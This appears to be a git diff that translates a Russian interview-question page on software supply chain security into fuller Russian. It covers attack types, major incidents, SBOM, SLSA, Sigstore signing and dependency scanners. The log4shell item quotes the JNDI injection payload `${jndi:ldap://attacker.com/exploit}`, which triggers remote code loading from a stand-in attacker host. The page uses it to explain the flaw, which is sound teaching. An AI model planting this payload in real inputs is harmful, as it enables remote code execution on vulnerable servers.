@@ -18,7 +18,7 @@ updated: "2026-04-25"
 ---
 # Вопросы на собеседовании: `Supply Chain Security`
 
-`Software Supply Chain Security` — защита кода, dependencies, build-process, artifacts от **tampering и compromise**. После incidents — **SolarWinds (2020)**, **log4shell (2021)**, **xz utils backdoor (2024)** — стало **top priority**. Инструменты: **SBOM** (bill of materials), **SLSA** (framework), **Sigstore/Cosign** (signing), **Dependabot/Trivy** (scanning).
+`Software Supply Chain Security` — защита кода, зависимостей, процесса сборки и артефактов от **подмены (tampering) и компрометации**. После инцидентов — **SolarWinds (2020)**, **log4shell (2021)**, **xz utils backdoor (2024)** — тема стала **высшим приоритетом**. Инструменты: **SBOM** (опись компонентов), **SLSA** (фреймворк), **Sigstore/Cosign** (подпись), **Dependabot/Trivy** (сканирование).
 
 ## Полезные ссылки
 
@@ -78,11 +78,11 @@ updated: "2026-04-25"
 
 ## Q1. (!) Что такое supply chain attack?
 
-**Supply chain attack** — атака **не на target прямо**, а через **trusted intermediaries**: вендоры, dependencies, build tools, CI/CD.
+**Supply chain attack** — атака **не напрямую на цель**, а через **доверенных посредников**: вендоров, зависимости, инструменты сборки, CI/CD.
 
-**Идея:** если вы не можете пробить defended organization, **compromise их supplier**. Их update pipe доставит malware **от вашего имени** (trusted).
+**Идея:** если не получается пробить защищённую организацию, **скомпрометируйте её поставщика**. Его канал обновлений доставит вредонос **от вашего имени** (как доверенный источник).
 
-**Attack surface:**
+**Поверхность атаки:**
 ```
 Source code → Build → Artifact → Distribution → Install → Runtime
      ↑           ↑         ↑           ↑            ↑         ↑
@@ -90,101 +90,101 @@ Source code → Build → Artifact → Distribution → Install → Runtime
    secret     malware   binary                  package
 ```
 
-**Почему effective:**
-- Software trusts dependencies implicitly (thousands of transitive deps)
-- Updates auto-applied (trust vendor signatures)
-- Compromising **1 popular lib** = thousands victims
-- Detection difficult (malicious commit хорошо спрятан)
+**Почему это работает:**
+- Софт неявно доверяет зависимостям (тысячи транзитивных deps)
+- Обновления применяются автоматически (доверие к подписям вендора)
+- Компрометация **1 популярной библиотеки** = тысячи жертв
+- Обнаружение затруднено (вредоносный коммит хорошо спрятан)
 
-**Real-world:**
-- NPM packages с 1M+ downloads compromised через stolen maintainer credentials
-- Docker Hub images with cryptominers
-- PyPI typosquatting (`requests` vs `reqeusts`)
+**Из реальной жизни:**
+- NPM-пакеты с 1M+ загрузок скомпрометированы через украденные учётки мейнтейнеров
+- Образы Docker Hub с криптомайнерами
+- Typosquatting в PyPI (`requests` vs `reqeusts`)
 
-**Impact:** **downstream explosion** — 1 compromise → hundreds orgs.
+**Последствия:** **взрыв вниз по цепочке** — 1 компрометация → сотни организаций.
 
 ## Q2. (!) Известные incidents (SolarWinds, log4shell, xz)?
 
-**SolarWinds / SUNBURST (Dec 2020):**
-- APT group (Russian SVR) compromised **SolarWinds Orion** (network monitoring)
-- Malicious code в update signed SolarWinds cert
-- **18,000+ customers** downloaded backdoor; ~100 actively exploited
-- Victims: US Treasury, DHS, Microsoft, FireEye
-- Lesson: build pipeline compromise → signed malware
+**SolarWinds / SUNBURST (дек. 2020):**
+- APT-группа (российская СВР) скомпрометировала **SolarWinds Orion** (мониторинг сети)
+- Вредоносный код попал в обновление, подписанное сертификатом SolarWinds
+- **18 000+ клиентов** скачали бэкдор; ~100 атакованы активно
+- Жертвы: казначейство США, DHS, Microsoft, FireEye
+- Урок: компрометация build-пайплайна → подписанный вредонос
 
-**log4shell / CVE-2021-44228 (Dec 2021):**
-- **Apache log4j 2.x** RCE — JNDI injection через log message
-- `${jndi:ldap://attacker.com/exploit}` в any logged string → RCE
-- **CVSS 10.0** — максимум severity
-- **Везде:** Minecraft, iCloud, Steam, millions apps
-- Lesson: transitive dep vulnerabilities; SBOM нужен; patch time critical
+**log4shell / CVE-2021-44228 (дек. 2021):**
+- RCE в **Apache log4j 2.x** — JNDI-инъекция через сообщение лога
+- `${jndi:ldap://attacker.com/exploit}` в любой залогированной строке → RCE
+- **CVSS 10.0** — максимальная серьёзность
+- **Везде:** Minecraft, iCloud, Steam, миллионы приложений
+- Урок: уязвимости транзитивных зависимостей; нужен SBOM; время до патча критично
 
-**xz utils backdoor / CVE-2024-3094 (Mar 2024):**
-- Long-term **social engineering**: attacker "Jia Tan" 2+ years contributed xz utils (compression lib)
-- Became maintainer, inserted **backdoor** в `liblzma` → SSH auth bypass
-- Affected Debian/Ubuntu unstable; **caught by accident** by Microsoft engineer (sshd slow)
-- Lesson: single-maintainer critical infra vulnerable; human factor
+**xz utils backdoor / CVE-2024-3094 (март 2024):**
+- Долгоиграющая **социальная инженерия**: атакующий «Jia Tan» 2+ года контрибьютил в xz utils (библиотека сжатия)
+- Стал мейнтейнером, вставил **бэкдор** в `liblzma` → обход SSH-аутентификации
+- Затронул unstable-ветки Debian/Ubuntu; **обнаружен случайно** инженером Microsoft (sshd тормозил)
+- Урок: критичная инфраструктура с единственным мейнтейнером уязвима; человеческий фактор
 
-**codecov (2021):** CI coverage tool compromised → env vars экspеrfiltrated many orgs.
+**codecov (2021):** инструмент CI-покрытия скомпрометирован → переменные окружения утекли из многих организаций.
 
-**event-stream (2018):** NPM package transferred to attacker → malicious code to steal Bitcoin wallets.
+**event-stream (2018):** NPM-пакет передан атакующему → вредоносный код для кражи Bitcoin-кошельков.
 
-**Summary:** build-time, dependency, и **human** are all attack vectors.
+**Итог:** время сборки, зависимости и **человек** — всё это векторы атаки.
 
 ## Q3. (!) Типы supply chain attacks?
 
 **По вектору:**
 
 **1. Dependency confusion:**
-- Attacker publishes package с тем же именем на public registry; CI fetches attacker's version вместо private
-- Fixed: explicit scopes, internal registry priority
+- Атакующий публикует пакет с тем же именем в публичном реестре; CI тянет версию атакующего вместо приватной
+- Решение: явные scopes, приоритет внутреннего реестра
 
 **2. Typosquatting:**
-- Lookalike names: `urllib` vs `urllib3` vs `ur11ib3` → installed by typo
+- Похожие имена: `urllib` vs `urllib3` vs `ur11ib3` → ставится по опечатке
 
-**3. Protestware / maintainer action:**
-- Legit maintainer adds malicious code (politics, burnout, sold rights)
-- Example: `node-ipc` 2022 — maintainer added code deleting files on Russian IPs
+**3. Protestware / действия мейнтейнера:**
+- Легитимный мейнтейнер добавляет вредоносный код (политика, выгорание, продал права)
+- Пример: `node-ipc` 2022 — мейнтейнер добавил код, удаляющий файлы на российских IP
 
-**4. Compromised account:**
-- Stolen npm/PyPI creds → publish malicious version
-- Example: ua-parser-js, coa, rc (2021)
+**4. Скомпрометированный аккаунт:**
+- Украденные учётки npm/PyPI → публикация вредоносной версии
+- Пример: ua-parser-js, coa, rc (2021)
 
-**5. Build system compromise:**
-- Attacker injects into CI → signed artifact contains malware
-- Example: SolarWinds
+**5. Компрометация build-системы:**
+- Атакующий внедряется в CI → подписанный артефакт содержит вредонос
+- Пример: SolarWinds
 
-**6. Source repo compromise:**
-- Push to GitHub via stolen token
-- Example: PHP Git server (2021) — attackers pushed backdoor to php-src
+**6. Компрометация репозитория исходников:**
+- Push в GitHub по украденному токену
+- Пример: Git-сервер PHP (2021) — атакующие запушили бэкдор в php-src
 
-**7. Upstream vuln:**
-- Transitive dep has CVE (e.g., log4shell in any Java app)
+**7. Уязвимость в upstream:**
+- У транзитивной зависимости есть CVE (например, log4shell в любом Java-приложении)
 
-**8. Dormant / long-con:**
-- Build trust for years, then inject (xz)
+**8. Спящая / долгая игра (long-con):**
+- Годами выстраивают доверие, затем внедряют вредонос (xz)
 
-**9. Package swap / hijack:**
-- Attacker registers abandoned package name
+**9. Захват / угон пакета:**
+- Атакующий регистрирует имя заброшенного пакета
 
-**10. CDN / mirror attack:**
-- Tamper in distribution layer
+**10. Атака на CDN / зеркало:**
+- Подмена на уровне распространения
 
-**Controls:** SBOM, signing, SLSA, dependency review, pinned versions, reproducible builds.
+**Контрмеры:** SBOM, подпись, SLSA, ревью зависимостей, закреплённые версии, воспроизводимые сборки.
 
 ## Q4. (!) Что такое SBOM?
 
-**SBOM (Software Bill of Materials)** — **inventory** всех components (direct + transitive) в software: libraries, versions, licenses, origins.
+**SBOM (Software Bill of Materials)** — **опись** всех компонентов (прямых + транзитивных) в ПО: библиотеки, версии, лицензии, происхождение.
 
-**Analogy:** как **food ingredients label** — "содержит: wheat, soy, ..." — но для software.
+**Аналогия:** как **этикетка состава продукта** — «содержит: пшеницу, сою, …» — но для софта.
 
 **Зачем:**
-- **Vulnerability response:** log4shell — "есть ли у нас log4j?" SBOM даёт instant answer
-- **License compliance:** какие GPL/AGPL в codebase?
-- **Regulatory:** US Executive Order 14028 (2021) — SBOM required для federal software; EU CRA (2024)
-- **Vendor due diligence:** knowing what's inside before buying
+- **Реакция на уязвимости:** log4shell — «есть ли у нас log4j?» SBOM даёт мгновенный ответ
+- **Лицензионный комплаенс:** какие GPL/AGPL в кодовой базе?
+- **Регуляторика:** Executive Order 14028 в США (2021) — SBOM обязателен для федерального ПО; EU CRA (2024)
+- **Due diligence по вендору:** понимать, что внутри, до покупки
 
-**Content:**
+**Содержимое:**
 ```json
 {
   "component": "spring-core",
@@ -196,49 +196,49 @@ Source code → Build → Artifact → Distribution → Install → Runtime
 }
 ```
 
-**Formats:**
-- **SPDX** (Linux Foundation) — ISO standard
-- **CycloneDX** (OWASP) — security-focused
-- **SWID tags** — older, less common
+**Форматы:**
+- **SPDX** (Linux Foundation) — ISO-стандарт
+- **CycloneDX** (OWASP) — с фокусом на безопасность
+- **SWID tags** — более старый, менее распространённый
 
-**Generation:** automated at build time (not manually maintained).
+**Генерация:** автоматически на этапе сборки (а не вручную).
 
-**Depth:** ideally **transitive + file-level hashes** (know exact bytes shipped).
+**Глубина:** в идеале **транзитивные зависимости + хеши на уровне файлов** (знать, какие именно байты поставлены).
 
 ## Q5. (!) SPDX vs CycloneDX?
 
 **SPDX:**
 - Linux Foundation, **ISO/IEC 5962:2021**
-- Focus: **licensing, compliance, metadata**
-- Formats: Tag-Value, JSON, YAML, RDF/XML
-- Deeply integrated с legal review
-- Less security-focused
+- Фокус: **лицензирование, комплаенс, метаданные**
+- Форматы: Tag-Value, JSON, YAML, RDF/XML
+- Глубоко интегрирован с юридическим ревью
+- Меньше ориентирован на безопасность
 
 **CycloneDX:**
-- OWASP project (2017)
-- Focus: **security, vulnerabilities**
-- Formats: JSON, XML, Protobuf
-- Native VEX (Vulnerability Exploitability eXchange) support
-- Services, frameworks, ML models, crypto (SBOM variants: SaaSBOM, MLBOM, CBOM)
+- Проект OWASP (2017)
+- Фокус: **безопасность, уязвимости**
+- Форматы: JSON, XML, Protobuf
+- Нативная поддержка VEX (Vulnerability Exploitability eXchange)
+- Сервисы, фреймворки, ML-модели, криптография (варианты SBOM: SaaSBOM, MLBOM, CBOM)
 
-**Comparison:**
+**Сравнение:**
 
-| Aspect | SPDX | CycloneDX |
+| Аспект | SPDX | CycloneDX |
 |--------|------|-----------|
-| Origin | Linux Foundation | OWASP |
-| Focus | Compliance/license | Security |
-| Age | 2011 | 2017 |
-| Size | Verbose | Compact |
-| Ecosystem | Strong in FOSS/legal | Strong in security tooling |
-| Tools | Syft, SPDX tools | Syft, CycloneDX CLI |
+| Происхождение | Linux Foundation | OWASP |
+| Фокус | Комплаенс/лицензии | Безопасность |
+| Возраст | 2011 | 2017 |
+| Объём | Многословный | Компактный |
+| Экосистема | Силён в FOSS/юр. | Силён в security-тулинге |
+| Инструменты | Syft, SPDX tools | Syft, CycloneDX CLI |
 
-**Pragmatic:** **both generated** сейчас (tooling supports обе) — CycloneDX чаще для security workflows, SPDX для legal/compliance.
+**Прагматично:** сейчас **генерируют оба** (тулинг поддерживает оба) — CycloneDX чаще для security-процессов, SPDX для юридических/комплаенс-задач.
 
-**Industry trend:** most orgs generate **both** (tools like `syft` support one-command for каждой).
+**Тренд индустрии:** большинство организаций генерируют **оба** (инструменты вроде `syft` поддерживают генерацию каждого одной командой).
 
 ## Q6. Как генерировать SBOM?
 
-**Language-specific tools:**
+**Инструменты под конкретные языки:**
 
 **Java (Maven):**
 ```xml
@@ -266,13 +266,13 @@ cyclonedx-py --format json -o sbom.json
 cyclonedx-gomod mod -output sbom.json
 ```
 
-**Universal: Syft (Anchore):**
+**Универсальный: Syft (Anchore):**
 ```bash
 syft dir:. -o cyclonedx-json > sbom.json
 syft image:myapp:1.0 -o spdx-json > sbom.json
 ```
 
-**Container images:**
+**Образы контейнеров:**
 ```bash
 # Docker (Docker 23+)
 docker sbom myapp:1.0
@@ -281,7 +281,7 @@ docker sbom myapp:1.0
 docker buildx build --sbom=true --push ...
 ```
 
-**In CI/CD (GitHub Actions):**
+**В CI/CD (GitHub Actions):**
 ```yaml
 - uses: anchore/sbom-action@v0
   with:
@@ -289,112 +289,112 @@ docker buildx build --sbom=true --push ...
     output-file: sbom.json
 ```
 
-**Store as artifact** и **attach to release**; also push to dependency-track server для continuous monitoring.
+**Сохранить как артефакт** и **приложить к релизу**; также пушить на сервер dependency-track для непрерывного мониторинга.
 
 ## Q7. (!) Что такое SLSA framework?
 
-**SLSA (Supply-chain Levels for Software Artifacts)** — **pronounce "salsa"** — framework от Google/Linux Foundation. Defines **maturity levels** для build pipeline security.
+**SLSA (Supply-chain Levels for Software Artifacts)** — **читается «salsa»** — фреймворк от Google/Linux Foundation. Определяет **уровни зрелости** для безопасности build-пайплайна.
 
-**Цель:** доказать что artifact **built as claimed** (no tampering).
+**Цель:** доказать, что артефакт **собран как заявлено** (без подмены).
 
-**Threats addressed:**
-- **Source integrity:** tampering commits, stolen creds
-- **Build integrity:** malicious build tool, parallel build hijack
-- **Distribution integrity:** swapped binaries на mirror
+**Какие угрозы закрывает:**
+- **Целостность исходников:** подмена коммитов, украденные учётки
+- **Целостность сборки:** вредоносный инструмент сборки, угон параллельной сборки
+- **Целостность распространения:** подменённые бинарники на зеркале
 
-**Key concepts:**
-- **Provenance:** metadata — **где/как/кем** built artifact
-- **Attestations:** signed statements ("build passed tests", "scanned for CVEs")
-- **Trusted builders:** isolated, auditable CI
+**Ключевые понятия:**
+- **Provenance:** метаданные — **где/как/кем** собран артефакт
+- **Attestations:** подписанные утверждения («сборка прошла тесты», «просканировано на CVE»)
+- **Доверенные сборщики (builders):** изолированный, аудируемый CI
 
-**Non-goals:**
-- Не сам code quality / correctness (это separate)
-- Не runtime security
-- Не prevents bugs в dependencies
+**Чего SLSA не делает:**
+- Не отвечает за качество/корректность кода (это отдельно)
+- Не про runtime-безопасность
+- Не предотвращает баги в зависимостях
 
-**Adoption:** Google internal, GitHub Actions (SLSA L3 builder), Kubernetes.
+**Внедрение:** внутри Google, GitHub Actions (билдер SLSA L3), Kubernetes.
 
-**Version:** 1.0 released 2023.
+**Версия:** 1.0 выпущена в 2023.
 
 ## Q8. (!) SLSA levels 1-4?
 
-**L1 — Documented build process:**
-- Build script exists
-- Generates provenance (automated, non-falsified)
-- Minimal effort, basic
+**L1 — задокументированный процесс сборки:**
+- Есть скрипт сборки
+- Генерируется provenance (автоматически, без подделки)
+- Минимум усилий, базовый уровень
 
-**L2 — Hosted build:**
-- Version control used
-- Hosted build service (GitHub Actions, CircleCI — not local laptop)
-- Signed provenance
-- Protects против casual tampering
+**L2 — размещённая (hosted) сборка:**
+- Используется система контроля версий
+- Размещённый build-сервис (GitHub Actions, CircleCI — не локальный ноутбук)
+- Подписанный provenance
+- Защищает от случайной/непрофессиональной подмены
 
-**L3 — Hardened build:**
-- **Isolated builder** (no parallel tenant interference)
-- **Non-falsifiable provenance** (ephemeral identity, OIDC)
-- Source + build platform **enforced** (no bypassing)
-- Example: GitHub Actions with `slsa-github-generator`
+**L3 — усиленная (hardened) сборка:**
+- **Изолированный сборщик** (нет влияния параллельных арендаторов)
+- **Неподделываемый provenance** (эфемерная identity, OIDC)
+- Источник + build-платформа **принудительно проверяются** (обход невозможен)
+- Пример: GitHub Actions с `slsa-github-generator`
 
-**L4 — originally most strict (retired in 1.0):**
-- Two-person review всех changes
-- Hermetic + reproducible builds
-- Stricter than most orgs tolerate
+**L4 — изначально самый строгий (упразднён в 1.0):**
+- Ревью всех изменений двумя людьми
+- Герметичные + воспроизводимые сборки
+- Строже, чем большинство организаций готовы терпеть
 
 **SLSA 1.0 (2023):**
-- Only **Build track** standardized (Source и Dependency tracks WIP)
-- Levels: Build L1, L2, L3
-- L4 dropped — focus on realistic adoption
+- Стандартизирован только **Build track** (Source- и Dependency-tracks в работе)
+- Уровни: Build L1, L2, L3
+- L4 убран — упор на реалистичное внедрение
 
-**Pragmatic path:**
-1. **L1** — few days
-2. **L2** — move builds to trusted CI, sign artifacts
-3. **L3** — use SLSA generator, enforce provenance checks
+**Прагматичный путь:**
+1. **L1** — несколько дней
+2. **L2** — перенести сборки в доверенный CI, подписывать артефакты
+3. **L3** — использовать SLSA-генератор, принудительно проверять provenance
 
-**Consumers:** verify `slsa-verifier` checks provenance before deploying.
+**Потребители:** через `slsa-verifier` проверяют provenance перед деплоем.
 
 ## Q9. (!) Зачем подписывать artifacts?
 
-**Signing** — **digital signature** на artifact (JAR, Docker image, binary) с private key → consumer verifies с public key.
+**Signing** — **цифровая подпись** на артефакте (JAR, Docker-образ, бинарник) приватным ключом → потребитель проверяет публичным ключом.
 
 **Что даёт:**
-- **Authenticity:** artifact действительно от claimed publisher
-- **Integrity:** не modified after signing
-- **Non-repudiation:** publisher не может отрицать authorship
+- **Подлинность:** артефакт действительно от заявленного издателя
+- **Целостность:** не изменён после подписи
+- **Неотказуемость:** издатель не может отрицать авторство
 
-**Без signing:**
-- MITM attack: swap package в transit
-- Compromised mirror: serve malware
-- CDN / cache poisoning
+**Без подписи:**
+- MITM-атака: подмена пакета в пути
+- Скомпрометированное зеркало: раздаёт вредонос
+- Отравление CDN / кеша
 
-**Examples:**
-- **Apt:** GPG signatures on `.deb` packages; `apt` verifies before install
-- **Maven Central:** GPG signatures on JARs (required for publishing)
-- **Docker:** Notary / Cosign signatures on images
-- **npm:** signatures being rolled out
+**Примеры:**
+- **Apt:** GPG-подписи на `.deb`-пакетах; `apt` проверяет перед установкой
+- **Maven Central:** GPG-подписи на JAR (обязательны для публикации)
+- **Docker:** подписи Notary / Cosign на образах
+- **npm:** подписи постепенно внедряются
 
-**Traditional pain points:**
-- Key management (where store, rotate?)
-- Private key compromise = disaster
-- Developer friction (sign manually? automate?)
+**Традиционные болевые точки:**
+- Управление ключами (где хранить, как ротировать?)
+- Компрометация приватного ключа = катастрофа
+- Трение для разработчика (подписывать вручную? автоматизировать?)
 
-**Modern solution:** **keyless** signing (Sigstore).
+**Современное решение:** **keyless**-подпись (Sigstore).
 
-**Verification is key:** signed artifact без verification = still insecure. Enforce в deploy pipeline:
+**Проверка — ключевой момент:** подписанный артефакт без проверки = всё равно небезопасен. Принудительно проверяйте в deploy-пайплайне:
 ```bash
 cosign verify --certificate-identity=... --certificate-oidc-issuer=... image:tag
 ```
 
 ## Q10. (!) Sigstore и Cosign?
 
-**Sigstore** — Linux Foundation project (2021). **Free, keyless artifact signing**. Backed by Google, RedHat, GitHub.
+**Sigstore** — проект Linux Foundation (2021). **Бесплатная keyless-подпись артефактов**. Поддерживается Google, RedHat, GitHub.
 
-**Key components:**
-- **Cosign** — CLI для signing/verifying
-- **Fulcio** — CA issuing short-lived certs (10 min)
-- **Rekor** — transparency log (append-only, auditable)
-- **Cosign** — tool combining всё
+**Ключевые компоненты:**
+- **Cosign** — CLI для подписи/проверки
+- **Fulcio** — CA, выпускающий короткоживущие сертификаты (10 мин)
+- **Rekor** — transparency-лог (append-only, аудируемый)
+- **Cosign** — инструмент, объединяющий всё
 
-**Architecture:**
+**Архитектура:**
 ```
 Developer
   ↓ "sign"
@@ -407,20 +407,20 @@ Cosign → uploads signature + cert
 Rekor (transparency log) ← immutable record
 ```
 
-**Advantages:**
-- **No long-lived keys** (никогда не compromised)
-- **Identity = OIDC** (developer email, GitHub repo)
-- **Auditable** (Rekor log)
-- **Free** (public service)
+**Преимущества:**
+- **Нет долгоживущих ключей** (нечего компрометировать)
+- **Identity = OIDC** (email разработчика, GitHub-репозиторий)
+- **Аудируемость** (лог Rekor)
+- **Бесплатно** (публичный сервис)
 
-**Cosign sign image:**
+**Cosign — подпись образа:**
 ```bash
 cosign sign --yes ghcr.io/myorg/app:1.0
 # Opens browser → sign in with Google/GitHub
 # Cert issued, artifact signed, entry в Rekor
 ```
 
-**Verify:**
+**Проверка:**
 ```bash
 cosign verify \
   --certificate-identity=https://github.com/myorg/build.yml@refs/heads/main \
@@ -428,50 +428,50 @@ cosign verify \
   ghcr.io/myorg/app:1.0
 ```
 
-**Hardcore trust:** verify identity matches expected GitHub workflow path → ensures artifact built by **your** CI, not attacker.
+**Жёсткое доверие:** проверьте, что identity совпадает с ожидаемым путём GitHub-workflow → гарантирует, что артефакт собран **вашим** CI, а не атакующим.
 
 ## Q11. Keyless signing (Fulcio, Rekor)?
 
-**Keyless** — signing без **long-lived private key**. Key exists только for 10 minutes.
+**Keyless** — подпись без **долгоживущего приватного ключа**. Ключ существует только 10 минут.
 
-**How:**
+**Как это работает:**
 
-1. **Developer authenticates** via OIDC (SSO identity)
-2. **Fulcio** (CA) verifies OIDC token → issues X.509 cert binding identity → ephemeral keypair
-3. **Cosign** signs artifact с ephemeral key
-4. Signature + cert + Rekor entry stored
+1. **Разработчик аутентифицируется** через OIDC (SSO-identity)
+2. **Fulcio** (CA) проверяет OIDC-токен → выпускает X.509-сертификат, привязывающий identity → эфемерная пара ключей
+3. **Cosign** подписывает артефакт эфемерным ключом
+4. Подпись + сертификат + запись в Rekor сохраняются
 
-**Ephemeral key destroyed** after signing. Even if stolen, expires in 10 min.
+**Эфемерный ключ уничтожается** после подписи. Даже если украдут, он истекает за 10 минут.
 
 **Fulcio (CA):**
-- Public CA (operated by Linux Foundation)
-- Issues cert binding (email / subject) → pubkey
-- Trust anchor: Sigstore root cert
+- Публичный CA (управляется Linux Foundation)
+- Выпускает сертификат, связывающий (email / subject) → публичный ключ
+- Якорь доверия: корневой сертификат Sigstore
 
-**Rekor (transparency log):**
-- Append-only Merkle tree (like Certificate Transparency)
-- Every signature recorded
-- Public queryable
-- Detects retroactive tampering (signer can't "unpublish")
+**Rekor (transparency-лог):**
+- Append-only дерево Меркла (как Certificate Transparency)
+- Каждая подпись фиксируется
+- Доступен для публичных запросов
+- Обнаруживает ретроспективную подмену (подписавший не может «отозвать публикацию»)
 
-**Verification без private key:**
-- Cert has short validity
-- Verify cert chain to Sigstore root
-- Check Rekor for entry existence и timestamp (signature made during cert validity)
+**Проверка без приватного ключа:**
+- Сертификат имеет короткий срок действия
+- Проверяем цепочку сертификатов до корня Sigstore
+- Проверяем в Rekor наличие записи и timestamp (подпись сделана в период действия сертификата)
 
-**Example:**
+**Пример:**
 ```bash
 # Identity from GitHub Actions workflow
 cosign sign-blob --yes artifact.tar.gz  # no key file!
 ```
 
-**Security win:** no "store the key safely" problem. Key never exists outside ephemeral CI job.
+**Выигрыш в безопасности:** нет проблемы «храни ключ надёжно». Ключ никогда не существует вне эфемерного CI-джоба.
 
 ## Q12. In-toto attestations?
 
-**in-toto** — framework defining **structured signed statements** об artifact.
+**in-toto** — фреймворк, определяющий **структурированные подписанные утверждения** об артефакте.
 
-**Attestation** — signed JSON:
+**Attestation** — подписанный JSON:
 ```json
 {
   "subject": [{"name": "myapp", "digest": {"sha256": "abc123..."}}],
@@ -486,14 +486,14 @@ cosign sign-blob --yes artifact.tar.gz  # no key file!
 }
 ```
 
-**Predicates (типы statements):**
-- `slsa-provenance` — SLSA provenance
-- `cyclonedx` — SBOM attestation
-- `vuln` — vulnerability scan result
-- `test` — test results passed
-- `policy` — custom policy compliance
+**Predicates (типы утверждений):**
+- `slsa-provenance` — SLSA-provenance
+- `cyclonedx` — attestation для SBOM
+- `vuln` — результат сканирования уязвимостей
+- `test` — тесты пройдены
+- `policy` — соответствие кастомной политике
 
-**Flow:**
+**Поток:**
 ```
 Source commit
   ↓ (attest: code reviewed by X)
@@ -507,220 +507,220 @@ Deploy
   ↓ (policy checks all attestations)
 ```
 
-**Enforcement:** admission controller (Kyverno, Gatekeeper) blocks deploy without required attestations.
+**Принуждение (enforcement):** admission controller (Kyverno, Gatekeeper) блокирует деплой без требуемых attestations.
 
-**Example (Cosign attest):**
+**Пример (Cosign attest):**
 ```bash
 cosign attest --predicate sbom.json --type cyclonedx image:tag
 cosign attest --predicate scan.json --type vuln image:tag
 ```
 
-**Verify:**
+**Проверка:**
 ```bash
 cosign verify-attestation --type cyclonedx --certificate-identity=... image:tag
 ```
 
-**Chain of trust:** consumers build policy requiring specific predicates с specific builders → trusted artifact.
+**Цепочка доверия:** потребители строят политику, требующую конкретные predicates от конкретных сборщиков → доверенный артефакт.
 
 ## Q13. (!) Dependabot vs Renovate?
 
-**Оба:** automated dependency updates (PRs to update libs).
+**Оба:** автоматизированное обновление зависимостей (PR на апдейт библиотек).
 
 **Dependabot (GitHub):**
-- Native в GitHub (free для all repos)
-- Config: `.github/dependabot.yml`
-- Per-dep PRs (one PR per update)
-- Security advisories от GitHub Advisory Database
-- Automatic grouping (v2)
-- Works with: npm, Maven, pip, Cargo, Go modules, Gradle, NuGet, composer, Docker, GitHub Actions
+- Нативный в GitHub (бесплатен для всех репозиториев)
+- Конфиг: `.github/dependabot.yml`
+- PR на каждую зависимость (один PR на обновление)
+- Security advisories из GitHub Advisory Database
+- Автоматическая группировка (v2)
+- Работает с: npm, Maven, pip, Cargo, Go modules, Gradle, NuGet, composer, Docker, GitHub Actions
 
 **Renovate (Mend):**
-- Open source, self-hosted or cloud
-- More configurable (presets, regex, custom managers)
-- Grouping и merge strategies more flexible
-- Support more package managers (Helm, Terraform, Kubernetes manifests)
-- **Auto-merge** configurable (e.g., auto-merge patches)
+- Open source, self-hosted или облако
+- Более настраиваемый (пресеты, regex, кастомные менеджеры)
+- Гибче группировка и стратегии merge
+- Поддерживает больше пакетных менеджеров (Helm, Terraform, манифесты Kubernetes)
+- **Auto-merge** настраиваемый (например, авто-merge патчей)
 
-**Comparison:**
+**Сравнение:**
 
-| Aspect | Dependabot | Renovate |
+| Аспект | Dependabot | Renovate |
 |--------|------------|----------|
-| Setup | Zero (GitHub) | Add bot/workflow |
-| Config | Simple YAML | Rich JSON |
-| Grouping | Basic | Powerful |
-| Custom managers | Limited | Regex custom |
-| Auto-merge | Less flexible | Flexible |
-| Schedule | Fixed cadence | Cron-style |
-| Ecosystems | Common | Broader |
+| Настройка | Нулевая (GitHub) | Добавить бота/workflow |
+| Конфиг | Простой YAML | Богатый JSON |
+| Группировка | Базовая | Мощная |
+| Кастомные менеджеры | Ограниченно | Regex-кастом |
+| Auto-merge | Менее гибкий | Гибкий |
+| Расписание | Фиксированная частота | Cron-стиль |
+| Экосистемы | Распространённые | Шире |
 
 **Выбор:**
-- **Dependabot** — default для GitHub, small/medium repos, simplicity
-- **Renovate** — large monorepo, need customization, GitLab, многоязычный stack
+- **Dependabot** — по умолчанию для GitHub, малые/средние репозитории, простота
+- **Renovate** — большой монорепо, нужна кастомизация, GitLab, многоязычный стек
 
 **Best practice:**
-- Enable security updates (auto-PR on CVE)
-- Weekly schedule для version updates (avoid daily noise)
-- Group minor/patch updates (prefer fewer PRs)
-- CI must pass before merge
+- Включить security-обновления (авто-PR при CVE)
+- Еженедельное расписание для version-обновлений (избегать ежедневного шума)
+- Группировать minor/patch-обновления (меньше PR)
+- CI должен проходить перед merge
 
 ## Q14. (!) Trivy, Snyk, Grype — сравнение?
 
 **Trivy (Aqua Security):**
-- **Free, open source**
-- Scans: container images, filesystems, git repos, K8s clusters, SBOM, IaC (Terraform), secrets
-- Fast, comprehensive
-- CI-friendly (SARIF output for GitHub)
-- Used extensively (de facto open source leader)
+- **Бесплатный, open source**
+- Сканирует: образы контейнеров, файловые системы, git-репозитории, кластеры K8s, SBOM, IaC (Terraform), секреты
+- Быстрый, всесторонний
+- Дружелюбен к CI (вывод SARIF для GitHub)
+- Широко используется (де-факто лидер среди open source)
 
 **Snyk:**
-- **Commercial** (free tier limited)
-- Scans: code (SAST), dependencies, containers, IaC
-- Rich fix suggestions (auto-PR)
-- Vulnerability DB proprietary (often ahead of public)
-- Deep integrations (IDE, CI, PR comments)
+- **Коммерческий** (бесплатный тариф ограничен)
+- Сканирует: код (SAST), зависимости, контейнеры, IaC
+- Богатые подсказки по исправлению (авто-PR)
+- Проприетарная БД уязвимостей (часто опережает публичные)
+- Глубокие интеграции (IDE, CI, комментарии в PR)
 
 **Grype (Anchore):**
-- Free, open source
-- Focuses on **vulnerability scanning** of SBOMs и images
-- Pairs with **Syft** (SBOM gen)
-- Simple, fast
+- Бесплатный, open source
+- Фокус на **сканировании уязвимостей** SBOM и образов
+- В паре с **Syft** (генерация SBOM)
+- Простой, быстрый
 
-**Comparison:**
+**Сравнение:**
 
-| Aspect | Trivy | Snyk | Grype |
+| Аспект | Trivy | Snyk | Grype |
 |--------|-------|------|-------|
-| License | Free | Commercial | Free |
-| CVE DB | NVD, OSV, GHSA | Proprietary + public | NVD, GHSA |
-| Scope | Broad (IaC, secrets, SBOM) | Broad (SAST too) | Focused (vuln) |
-| Fix suggestions | Basic | Rich | Basic |
-| SBOM gen | Yes | No | No (needs Syft) |
-| IDE plugins | Limited | Rich | None |
+| Лицензия | Бесплатный | Коммерческий | Бесплатный |
+| БД CVE | NVD, OSV, GHSA | Проприетарная + публичные | NVD, GHSA |
+| Охват | Широкий (IaC, секреты, SBOM) | Широкий (плюс SAST) | Узкий (уязвимости) |
+| Подсказки по фиксу | Базовые | Богатые | Базовые |
+| Генерация SBOM | Да | Нет | Нет (нужен Syft) |
+| Плагины IDE | Ограниченно | Богато | Нет |
 
-**Typical stack:**
-- **Dev**: Snyk (rich IDE integration) or Trivy
-- **CI**: Trivy (free, fast)
